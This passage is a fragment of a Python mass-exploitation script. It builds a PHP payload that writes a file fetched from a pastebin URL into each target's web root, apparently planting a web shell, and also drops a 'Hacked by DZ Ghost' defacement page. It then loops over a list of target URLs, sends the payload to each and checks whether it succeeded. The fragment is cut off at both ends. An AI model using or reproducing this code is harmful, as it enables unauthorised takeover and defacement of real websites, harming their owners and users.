...
pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/9nas.php','w+'),file_get_contents('http://pastebin.com/raw/MgqpD40U')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/lol.html','w+'),'Hacked by DZ Ghost /9nas_007');")
for i in fil.readlines():
  try:
    i=i.strip()
    print get_url(i, pl)
    lala=requests.get(i+"/9nas.html")
